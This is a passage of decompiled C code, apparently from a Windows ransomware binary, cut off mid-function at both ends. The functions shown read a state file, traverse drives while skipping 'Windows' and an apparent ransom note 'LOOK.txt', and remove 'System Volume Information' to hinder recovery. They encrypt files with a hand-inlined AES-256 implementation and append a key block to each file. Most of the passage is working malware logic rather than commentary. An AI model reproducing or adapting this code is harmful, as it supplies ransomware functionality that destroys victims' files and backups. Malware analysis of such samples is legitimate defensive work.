            CloseHandle(v7);
            v5 = v23;
          }
        }
      }
      v23 = ++v5;
      if ( v5 >= 26 )
        break;
      v4 = Source;
    }
  }
  else
  {
    sub_4049C0((_DWORD *)Source + 195, Source);
  }
  return 1;
}

//----- (004057B0) --------------------------------------------------------
char __thiscall sub_4057B0(void *this)
{
  int v1; // esi
  HANDLE FileW; // edi
  wchar_t *v3; // eax
  int v4; // edx
  wchar_t v5; // cx
  wchar_t *v6; // eax
  wchar_t *v7; // eax
  int v8; // ebx
  wchar_t *v9; // edi
  _DWORD *v10; // eax
  const wchar_t *v11; // ecx
  void **v12; // edi
  void *v13; // ebx
  void **v14; // edi
  void *v15; // ebx
  int v16; // eax
  wchar_t **v18; // [esp+0h] [ebp-430h]
  wchar_t **v19; // [esp+0h] [ebp-430h]
  wchar_t **v20; // [esp+0h] [ebp-430h]
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-420h] BYREF
  int v22; // [esp+14h] [ebp-41Ch]
  wchar_t Buffer[260]; // [esp+18h] [ebp-418h] BYREF
  wchar_t Destination[262]; // [esp+220h] [ebp-210h] BYREF

  v1 = (int)this;
  v22 = (int)this;
  FileW = CreateFileW(L"Res.AAABANIx93RdufO4", 0xC0000000, 0, 0, 4u, 0x80u, 0);
  *(_DWORD *)(v1 + 808) = FileW;
  if ( FileW != (HANDLE)-1 )
  {
    NumberOfBytesRead = 0;
    memset(Buffer, 0, sizeof(Buffer));
    ReadFile(FileW, Buffer, 0x250u, &NumberOfBytesRead, 0);
    if ( NumberOfBytesRead > 0x40 )
    {
      v3 = wcstok(Buffer, L"\r\n", v18);
      if ( v3 )
      {
        v4 = v1 - (_DWORD)v3;
        do
        {
          v5 = *v3;
          *(wchar_t *)((char *)v3 + v4 + 812) = *v3;
          ++v3;
        }
        while ( v5 );
        v6 = wcstok(0, L"\r\n", v19);
        if ( v6 )
        {
          qmemcpy((void *)(v1 + 1332), v6, 0x40u);
          v7 = wcstok(0, L"\r\n", v20);
          if ( v7 )
          {
            v8 = v22;
            *(_DWORD *)(v22 + 1408) = *(_DWORD *)v7;
            *(_DWORD *)(v8 + 1412) = *((_DWORD *)v7 + 2);
            sub_404AD0(v8);
          }
          v1 = v22;
        }
      }
    }
  }
  *(_DWORD *)(v1 + 792) = 0;
  *(_DWORD *)(v1 + 796) = 0;
  *(_DWORD *)(v1 + 800) = 0;
  *(_DWORD *)(v1 + 804) = 0;
  sub_404980((void **)(v1 + 780));
  v9 = (wchar_t *)v22;
  sub_404980((void **)(v22 + 784));
  sub_405370(v9);
  while ( *(_DWORD *)(v1 + 780) )
  {
    while ( *(_DWORD *)(v1 + 780) )
    {
      v10 = *(_DWORD **)(v1 + 780);
      if ( !v10 )
        break;
      v11 = (const wchar_t *)v10[1];
      *(_DWORD *)(v1 + 780) = *v10;
      wcsncpy_s(Destination, 0x104u, v11, 0x104u);
      if ( wcscmp(&Buffer[wcslen(Destination) + 259], asc_418C50) )
        wcsncat_s(Destination, 0x104u, asc_418C50, 0x104u);
      sub_405AD0(Destination, v22);
    }
    while ( 1 )
    {
      v12 = *(void ***)(v1 + 780);
      if ( !v12 )
        break;
      v13 = *v12;
      if ( v12[1] )
        operator delete(v12[1]);
      *v12 = 0;
      v12[1] = 0;
      operator delete(v12);
      *(_DWORD *)(v1 + 780) = v13;
    }
    while ( 1 )
    {
      v14 = *(void ***)(v1 + 780);
      if ( !v14 )
        break;
      v15 = *v14;
      if ( v14[1] )
        operator delete(v14[1]);
      *v14 = 0;
      v14[1] = 0;
      operator delete(v14);
      *(_DWORD *)(v1 + 780) = v15;
    }
    v16 = v22;
    *(_DWORD *)(v1 + 780) = *(_DWORD *)(v22 + 784);
    *(_DWORD *)(v16 + 784) = 0;
  }
  if ( *(_DWORD *)(v22 + 808) != -1 )
    CloseHandle(*(HANDLE *)(v22 + 808));
  return 1;
}
// 405853: variable 'v18' is possibly undefined
// 405889: variable 'v19' is possibly undefined
// 4058AB: variable 'v20' is possibly undefined

//----- (00405AD0) --------------------------------------------------------
char __usercall sub_405AD0@<al>(wchar_t *Source@<ecx>, int a2@<edi>)
{
  const wchar_t *v2; // ebx
  HANDLE hFindFile; // [esp+14h] [ebp-464h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-460h] BYREF
  WCHAR FileName[262]; // [esp+268h] [ebp-210h] BYREF

  v2 = Source;
  memset(FileName, 0, 520);
  wcscpy_s(FileName, 0x104u, Source);
  wcscat_s(FileName, 0x104u, L"*.*");
  hFindFile = FindFirstFileW(FileName, &FindFileData);
  if ( hFindFile != (HANDLE)-1 )
  {
    do
    {
      if ( (FindFileData.dwFileAttributes & 4) == 0 )
      {
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          wcscpy_s(FileName, 0x104u, v2);
          wcscat_s(FileName, 0x104u, FindFileData.cFileName);
          if ( _wcsicmp(FindFileData.cFileName, L"Windows") )
          {
            if ( _wcsicmp(FindFileData.cFileName, L"System Volume Information") )
            {
              if ( wcscmp(FindFileData.cFileName, L".") && wcscmp(FindFileData.cFileName, L"..") )
              {
                sub_4049C0((_DWORD *)(a2 + 784), FileName);
                v2 = Source;
              }
            }
            else
            {
              RemoveDirectoryW(FileName);
            }
          }
        }
        else if ( wcscmp(FindFileData.cFileName, L"LOOK.txt") )
        {
          if ( wcscmp(FindFileData.cFileName, L"Res.AAABANIx93RdufO4") )
          {
            wcscpy_s(FileName, 0x104u, v2);
            wcscat_s(FileName, 0x104u, FindFileData.cFileName);
            if ( *(_QWORD *)&FindFileData.nFileSizeHigh )
            {
              if ( sub_404F10(a2, FileName, __PAIR64__(FindFileData.nFileSizeHigh, FindFileData.nFileSizeLow)) )
                ++*(_QWORD *)(a2 + 792);
              else
                ++*(_QWORD *)(a2 + 800);
            }
          }
        }
      }
    }
    while ( FindNextFileW(hFindFile, &FindFileData) );
  }
  FindClose(hFindFile);
  return 1;
}
// 419058: using guessed type wchar_t asc_419058[2];
// 41905C: using guessed type wchar_t asc_41905C[3];

//----- (00405DC0) --------------------------------------------------------
bool __userpurge sub_405DC0@<al>(const void *a1@<edi>, void *a2@<esi>, int a3, int a4)
{
  bool result; // al
  DWORD NumberOfBytesWritten; // [esp+8h] [ebp-10h] BYREF
  int Buffer[2]; // [esp+Ch] [ebp-Ch] BYREF

  result = SetFilePointerEx(a2, 0i64, 0, 2u)
        && (Buffer[0] = a3, Buffer[1] = a4,
                            NumberOfBytesWritten = 0,
                            WriteFile(a2, Buffer, 8u, &NumberOfBytesWritten, 0))
        && WriteFile(a2, a1, 0x100u, &NumberOfBytesWritten, 0);
  return result;
}

//----- (00405E50) --------------------------------------------------------
__int64 __userpurge sub_405E50@<edx:eax>(void *a1@<ebx>, unsigned __int64 a2)
{
  __int64 result; // rax
  DWORD NumberOfBytesRead; // [esp+8h] [ebp-10h] BYREF
  __int64 Buffer; // [esp+Ch] [ebp-Ch] BYREF

  if ( a2 <= 0x108 )
    return 0i64;
  NumberOfBytesRead = 0;
  if ( !SetFilePointerEx(a1, (LARGE_INTEGER)-264i64, 0, 2u) )
    return 0i64;
  Buffer = 0i64;
  if ( !ReadFile(a1, &Buffer, 8u, &NumberOfBytesRead, 0) )
    return 0i64;
  result = Buffer;
  if ( a2 - Buffer - 264 > 0x10 )
    return 0i64;
  return result;
}

//----- (00405EF0) --------------------------------------------------------
unsigned int __fastcall sub_405EF0(unsigned int a1, int a2, _DWORD *a3, int a4)
{
  unsigned int v4; // ebx
  _DWORD *v5; // edi
  _BYTE *v7; // eax
  int *v8; // eax
  unsigned int v9; // ecx
  unsigned int v10; // edx
  _DWORD *v11; // esi
  unsigned int v12; // edi
  bool v13; // zf
  int v14; // esi
  unsigned int v16; // [esp+Ch] [ebp-20h]
  unsigned int v17; // [esp+10h] [ebp-1Ch]
  unsigned int v18; // [esp+14h] [ebp-18h]
  int v19; // [esp+14h] [ebp-18h]
  unsigned int v20; // [esp+20h] [ebp-Ch]
  unsigned int v21; // [esp+24h] [ebp-8h]

  v4 = a1;
  v5 = a3;
  v16 = a1;
  if ( (a1 & 0xF) != 0 )
  {
    do
      ++v4;
    while ( (v4 & 0xF) != 0 );
    v16 = v4;
  }
  if ( a1 )
  {
    v7 = (_BYTE *)a2;
    v18 = a1;
    do
    {
      *v7 = v7[a4 - a2];
      ++v7;
      --v18;
    }
    while ( v18 );
  }
  if ( a1 < v4 )
    memset((void *)(a2 + a1), 0, v4 - a1);
  if ( !(v4 >> 4) )
    return v4;
  v8 = (int *)(a2 + 8);
  v17 = v4 >> 4;
  do
  {
    *(v8 - 2) ^= *v5;
    *(v8 - 1) ^= v5[1];
    *v8 ^= v5[2];
    v8[1] ^= v5[3];
    v9 = *(v8 - 2);
    v10 = *(v8 - 1);
    v11 = v5 + 2;
    v20 = *v8;
    v12 = v8[1];
    v21 = v12;
    v19 = 13;
    do
    {
      *(v8 - 2) = v11[2] ^ dword_4175C8[(unsigned __int8)v9] ^ dword_4179C8[BYTE1(v10)] ^ dword_417DC8[BYTE2(v20)] ^ dword_4181C8[HIBYTE(v12)];
      v11 += 4;
      *(v8 - 1) = *(v11 - 1) ^ dword_4175C8[(unsigned __int8)v10] ^ dword_4181C8[HIBYTE(v9)] ^ dword_4179C8[BYTE1(v20)] ^ dword_417DC8[BYTE2(v21)];
      *v8 = *v11 ^ dword_4175C8[(unsigned __int8)v20] ^ dword_417DC8[BYTE2(v9)] ^ dword_4181C8[HIBYTE(v10)] ^ dword_4179C8[BYTE1(v21)];
      v13 = v19-- == 1;
      v8[1] = v11[1] ^ dword_4175C8[(unsigned __int8)v21] ^ dword_4179C8[BYTE1(v9)] ^ dword_417DC8[BYTE2(v10)] ^ dword_4181C8[HIBYTE(v20)];
      v9 = *(v8 - 2);
      v10 = *(v8 - 1);
      v20 = *v8;
      v12 = v8[1];
      v21 = v12;
    }
    while ( !v13 );
    v14 = (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v9] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v10)] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v20)] ^ ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v12)] << 8)) << 8)) << 8);
    v5 = a3;
    *(v8 - 2) = a3[56] ^ v14;
    *(v8 - 1) = a3[57] ^ (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v10] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v20)] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v21)] ^ ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v9)] << 8)) << 8)) << 8);
    *v8 = a3[58] ^ (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v20] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v9)] ^ ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v10)] << 8)) << 8)) << 8);
    v8[1] = a3[59] ^ (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v21] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v9)] ^ (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v10)] ^ ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v20)] << 8)) << 8)) << 8);
    v8 += 4;
    --v17;
  }
  while ( v17 );
  return v16;
}
// 4175C8: using guessed type int dword_4175C8[256];
// 4179C8: using guessed type int dword_4179C8[256];
// 417DC8: using guessed type int dword_417DC8[256];
// 4181C8: using guessed type int dword_4181C8[256];

//----- (00406210) --------------------------------------------------------
int __thiscall sub_406210(int *this, unsigned __int8 *a2)
{
  int v2; // edx
  unsigned int v3; // edi
  int *v4; // eax
  unsigned int v5; // edx
  int v6; // esi
  unsigned int v7; // edx
  int v8; // esi
  unsigned int v9; // edx
  int v10; // ebx
  int v11; // esi
  unsigned int v12; // edx
  int v13; // esi
  unsigned int v14; // edx
  int v15; // esi
  unsigned int v16; // edx
  int v17; // ebx
  int v18; // esi
  int v19; // edx
  int v20; // eax
  int v21; // edx
  int v22; // eax
  int v23; // edx
  int v24; // esi
  int v25; // eax
  int v26; // edx
  int v27; // edi
  int result; // eax
  unsigned int v29; // [esp+8h] [ebp-34h]
  unsigned int v30; // [esp+8h] [ebp-34h]
  int v31[11]; // [esp+Ch] [ebp-30h]

  *this = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);
  this[1] = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);
  this[2] = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);
  this[3] = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);
  this[4] = a2[16] | ((a2[17] | (*((unsigned __int16 *)a2 + 9) << 8)) << 8);
  this[5] = a2[20] | ((a2[21] | (*((unsigned __int16 *)a2 + 11) << 8)) << 8);
  v2 = a2[27];
  v31[1] = 1;
  v31[2] = 2;
  v31[3] = 4;
  v31[4] = 8;
  v31[5] = 16;
  v31[6] = 32;
  v31[7] = 64;
  v31[8] = 128;
  v31[9] = 27;
  v31[10] = 54;
  this[6] = a2[24] | ((a2[25] | ((a2[26] | (v2 << 8)) << 8)) << 8);
  this[7] = a2[28] | ((a2[29] | (*((unsigned __int16 *)a2 + 15) << 8)) << 8);
  v3 = 10;
  v4 = this;
  do
  {
    v5 = v4[7];
    v6 = (v3 - 2) & 7;
    v31[0] = v6;
    if ( !v6 )
    {
      v7 = __ROR4__(v5, 8);
      v5 = v31[(v3 - 2) >> 3] ^ ((unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v7] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v7)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v7)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v7)] << 8)) << 8)) << 8));
      v6 = 0;
    }
    if ( v6 == 4 )
      v5 = (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v5)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v5)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v5)] << 8)) << 8)) << 8) | (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v5];
    v8 = v5 ^ *v4;
    v4[8] = v8;
    v4[68] = v8;
    v9 = v8;
    v10 = ((_BYTE)v3 - 1) & 7;
    v31[0] = v10;
    if ( (((_BYTE)v3 - 1) & 7) == 0 )
    {
      v29 = __ROR4__(v8, 8);
      v10 = v31[0];
      v9 = v31[(v3 - 1) >> 3] ^ ((((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v29)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v29)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v29)] << 8)) << 8)) << 8) | (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v29]);
    }
    if ( v10 == 4 )
      v9 = (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v9)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v9)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v9)] << 8)) << 8)) << 8) | (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v9];
    v11 = v9 ^ v4[1];
    v4[9] = v11;
    v4[69] = v11;
    v12 = v11;
    v13 = v3 & 7;
    v31[0] = v13;
    if ( (v3 & 7) == 0 )
    {
      v14 = __ROR4__(v12, 8);
      v12 = v31[v3 >> 3] ^ ((unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v14] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v14)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v14)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v14)] << 8)) << 8)) << 8));
      v13 = v31[0];
    }
    if ( v13 == 4 )
      v12 = (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v12)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v12)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v12)] << 8)) << 8)) << 8) | (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v12];
    v15 = v12 ^ v4[2];
    v4[10] = v15;
    v4[70] = v15;
    v16 = v15;
    v17 = ((_BYTE)v3 + 1) & 7;
    v31[0] = v17;
    if ( (((_BYTE)v3 + 1) & 7) == 0 )
    {
      v30 = __ROR4__(v15, 8);
      v17 = v31[0];
      v16 = v31[(v3 + 1) >> 3] ^ ((((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v30)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v30)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v30)] << 8)) << 8)) << 8) | (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v30]);
    }
    if ( v17 == 4 )
      v16 = (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE1(v16)] | (((unsigned __int8)RijnDael_AES_LONG_4174C8[BYTE2(v16)] | ((unsigned __int8)RijnDael_AES_LONG_4174C8[HIBYTE(v16)] << 8)) << 8)) << 8) | (unsigned __int8)RijnDael_AES_LONG_4174C8[(unsigned __int8)v16];
    v18 = v16 ^ v4[3];
    v3 += 4;
    v4[11] = v18;
    v4[71] = v18;
    v4 += 4;
  }
  while ( v3 - 2 < 0x3C );
  v19 = this[1];
  this[60] = *this;
  v20 = this[2];
  this[61] = v19;
  v21 = this[3];
  this[62] = v20;
  v22 = this[4];
  this[63] = v21;
  v23 = this[5];
  v24 = (int)(this + 64);
  this[64] = v22;
  v25 = this[6];
  this[65] = v23;
  v26 = this[7];
  this[66] = v25;
  this[67] = v26;
  v27 = 13;
  do
  {
    result = sub_4066E0(v24);
    v24 += 16;
    --v27;
  }
  while ( v27 );
  return result;
}

//----- (004066E0) --------------------------------------------------------
int __usercall sub_4066E0@<eax>(int a1@<esi>)
{
  int result; // eax
  int v2; // edi
  int v3; // ecx
  int v4; // edx
  int v5; // ecx
  int v6; // edx
  int v7; // [esp+8h] [ebp-10h]
  int v8; // [esp+Ch] [ebp-Ch]
  int v9; // [esp+10h] [ebp-8h]

  for ( result = 0;
        result < 4;
        *(_DWORD *)(a1 + 4 * result - 4) = v6 | ((dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v8]] ^ BYTE1(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v9]]) ^ BYTE2(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v7]]) ^ HIBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v2]])) << 24) )
  {
    v2 = *(unsigned __int8 *)(a1 + 4 * result);
    v8 = *(unsigned __int8 *)(a1 + 4 * result + 3);
    v9 = *(unsigned __int8 *)(a1 + 4 * result + 2);
    v3 = *(unsigned __int8 *)(a1 + 4 * result + 1);
    v4 = BYTE2(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v9]]) ^ BYTE1(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v8]]) ^ HIBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v3]]) ^ LOBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v2]]);
    *(_DWORD *)(a1 + 4 * result) = v4;
    v7 = v3;
    v5 = v4 | ((HIBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v9]]) ^ BYTE2(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v8]]) ^ BYTE1(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v2]]) ^ LOBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v3]])) << 8);
    *(_DWORD *)(a1 + 4 * result) = v5;
    v6 = v5 | ((LOBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v9]]) ^ HIBYTE(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v8]]) ^ BYTE1(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v7]]) ^ BYTE2(dword_4185C8[(unsigned __int8)RijnDael_AES_LONG_4174C8[v2]])) << 16);
    *(_DWORD *)(a1 + 4 * result++) = v6;
  }
  return result;
}
// 4185C8: using guessed type int dword_4185C8[];

//----- (00406870) --------------------------------------------------------
int __usercall sub_406870@<eax>(char *a1@<edx>, char *Format, ...)
{
  va_list ArgList; // [esp+Ch] [ebp+Ch] BYREF

  va_start(ArgList, Format);
  return vsprintf_s(a1, 0x104u, Format, ArgList);
}

//----- (00406890) --------------------------------------------------------
std::exception *__thiscall sub_406890(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 4151C4: using guessed type void *std::logic_error::`vftable';

//----- (004068DD) --------------------------------------------------------
std::exception *__thiscall sub_4068DD(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 4151D0: using guessed type void *std::length_error::`vftable';

//----- (0040692A) --------------------------------------------------------
std::exception *__thiscall sub_40692A(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 4151DC: using guessed type void *std::out_of_range::`vftable';

//----- (00406947) --------------------------------------------------------
std::exception *__thiscall sub_406947(std::exception *this, char a2)
{
  sub_406AA9(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (00406AA9) --------------------------------------------------------
void __thiscall sub_406AA9(std::exception *this)
{
  *(_DWORD *)this = &std::exception::`vftable';
  std::exception::_Tidy(this);
}
// 415204: using guessed type void *std::exception::`vftable';

//----- (00406AB4) --------------------------------------------------------
std::exception *__thiscall sub_406AB4(std::exception *this, char a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  std::exception::_Tidy(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}
// 415204: using guessed type void *std::exception::`vftable';

//----- (004070B4) --------------------------------------------------------
void __thiscall sub_4070B4(struct type_info *this)
{
  *(_DWORD *)this = &type_info::`vftable';
  type_info::_Type_info_dtor(this);
}
// 415224: using guessed type void *type_info::`vftable';

//----- (004070C4) --------------------------------------------------------
struct type_info *__thiscall sub_4070C4(struct type_info *this, char a2)
{
  sub_4070B4(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (00407FF3) --------------------------------------------------------
void *__cdecl sub_407FF3(void *a1)
{
  void *result; // eax

  result = a1;
  Target = a1;
  return result;
}

//----- (004084B8) --------------------------------------------------------
int sub_4084B8()
{
  dword_41E044 = IsProcessorFeaturePresent(0xAu);
  return 0;
}
// 41E044: using guessed type int dword_41E044;

//----- (00409518) --------------------------------------------------------
void *__cdecl sub_409518(void *a1)
{
  void *result; // eax

  result = a1;
  dword_41C5BC = a1;
  return result;
}

//----- (0040954F) --------------------------------------------------------
void *__cdecl sub_40954F(void *a1)
{
  void *result; // eax

  result = a1;
  dword_41C5C0 = a1;
  return result;
}

//----- (004099E6) --------------------------------------------------------
int sub_4099E6()
{
  return flsall(1);
}
// 4098B9: using guessed type _DWORD __cdecl flsall(_DWORD);

//----- (00409B71) --------------------------------------------------------
void **sub_409B71()
{
  return &off_41B860;
}
// 41B860: using guessed type void *off_41B860;

//----- (0040A099) --------------------------------------------------------
PVOID sub_40A099()
{
  return DecodePointer(dword_41C604);
}

//----- (0040A249) --------------------------------------------------------
int __cdecl sub_40A249(int a1, int a2, int a3)
{
  HMODULE LibraryW; // eax
  HMODULE v4; // ebx
  int (__stdcall *MessageBoxW)(HWND, LPCWSTR, LPCWSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationW)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // edi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // ebx
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[4]; // [esp+Ch] [ebp-24h] BYREF
  int v19; // [esp+10h] [ebp-20h]
  int v20; // [esp+14h] [ebp-1Ch]
  PVOID v21; // [esp+18h] [ebp-18h]
  int v22; // [esp+1Ch] [ebp-14h]
  char v23[12]; // [esp+20h] [ebp-10h] BYREF

  v19 = a1;
  v20 = a2;
  v22 = 0;
  v21 = (PVOID)_encoded_null();
  if ( !dword_41C610 )
  {
    LibraryW = LoadLibraryW(L"USER32.DLL");
    v4 = LibraryW;
    if ( !LibraryW )
      return 0;
    MessageBoxW = (int (__stdcall *)(HWND, LPCWSTR, LPCWSTR, UINT))GetProcAddress(LibraryW, "MessageBoxW");
    if ( !MessageBoxW )
      return 0;
    dword_41C610 = EncodePointer(MessageBoxW);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, "GetActiveWindow");
    dword_41C614 = EncodePointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, "GetLastActivePopup");
    dword_41C618 = EncodePointer(GetLastActivePopup);
    GetUserObjectInformationW = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                          v4,
                                                                                          "GetUserObjectInformationW");
    dword_41C620 = EncodePointer(GetUserObjectInformationW);
    if ( dword_41C620 )
    {
      GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, "GetProcessWindowStation");
      dword_41C61C = EncodePointer(GetProcessWindowStation);
    }
  }
  if ( dword_41C61C == v21
    || dword_41C620 == v21
    || (v10 = (int (*)(void))DecodePointer(dword_41C61C),
        v11 = (int (__stdcall *)(int, int, char *, int, char *))DecodePointer(dword_41C620),
        v12 = v11,
        !v10)
    || !v11
    || (v13 = v10()) != 0 && v12(v13, 1, v23, 12, v18) && (v23[8] & 1) != 0 )
  {
    if ( dword_41C614 != v21 )
    {
      v14 = (int (*)(void))DecodePointer(dword_41C614);
      if ( v14 )
      {
        v22 = v14();
        if ( v22 )
        {
          if ( dword_41C618 != v21 )
          {
            v15 = (int (__stdcall *)(int))DecodePointer(dword_41C618);
            if ( v15 )
              v22 = v15(v22);
          }
        }
      }
    }
  }
  else
  {
    a3 |= 0x200000u;
  }
  v16 = (int (__stdcall *)(int, int, int, int))DecodePointer(dword_41C610);
  if ( v16 )
    return v16(v22, v19, v20, a3);
  return 0;
}
// 408EE5: using guessed type int _encoded_null(void);
// 40A249: using guessed type char var_24[4];

//----- (0040B759) --------------------------------------------------------
int sub_40B759()
{
  SetUnhandledExceptionFilter(__CxxUnhandledExceptionFilter);
  return 0;
}

//----- (0040C12E) --------------------------------------------------------
void *sub_40C12E()
{
  return &unk_419374;
}

//----- (0040C154) --------------------------------------------------------
void __cdecl sub_40C154()
{
  ;
}

//----- (0040C233) --------------------------------------------------------
void sub_40C233()
{
  dword_41CF18 = 0;
}
// 41CF18: using guessed type int dword_41CF18;

//----- (0040E93B) --------------------------------------------------------
int __cdecl sub_40E93B(int a1)
{
  int result; // eax

  result = a1;
  dword_41CF04 = a1;
  return result;
}
// 41CF04: using guessed type int dword_41CF04;

//----- (0040FC04) --------------------------------------------------------
HANDLE sub_40FC04()
{
  HANDLE result; // eax

  result = hObject;
  if ( hObject != (HANDLE)-1 && hObject != (HANDLE)-2 )
    return (HANDLE)CloseHandle(hObject);
  return result;
}

//----- (00410FD1) --------------------------------------------------------
void __thiscall sub_410FD1(std::exception *this)
{
  *(_DWORD *)this = &std::bad_exception::`vftable';
  sub_406AA9(this);
}
// 4190A4: using guessed type void *std::bad_exception::`vftable';

//----- (00410FDC) --------------------------------------------------------
std::exception *__thiscall sub_410FDC(std::exception *this, char a2)
{
  *(_DWORD *)this = &std::bad_exception::`vftable';
  sub_406AA9(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}
// 4190A4: using guessed type void *std::bad_exception::`vftable';

//----- (00411BAB) --------------------------------------------------------
std::exception *__thiscall sub_411BAB(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_exception::`vftable';
  return this;
}
// 4190A4: using guessed type void *std::bad_exception::`vftable';

//----- (00411D2D) --------------------------------------------------------
int __cdecl sub_411D2D(_DWORD *a1, int a2, struct localeinfo_struct *a3)
{
  int v3; // eax
  char v6[4]; // [esp+Ch] [ebp-28h] BYREF
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+18h] [ebp-1Ch]
  char v9; // [esp+1Ch] [ebp-18h]
  int v10; // [esp+20h] [ebp-14h]
  unsigned __int16 v11[6]; // [esp+24h] [ebp-10h] BYREF

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v7, a3);
  v10 = __strgtold12_l(v11, v6, a2, 0, 0, 0, 0, v7);
  v3 = sub_412206(v11, a1);
  if ( (v10 & 3) != 0 )
  {
    if ( (v10 & 1) != 0 )
      goto LABEL_8;
    if ( (v10 & 2) != 0 )
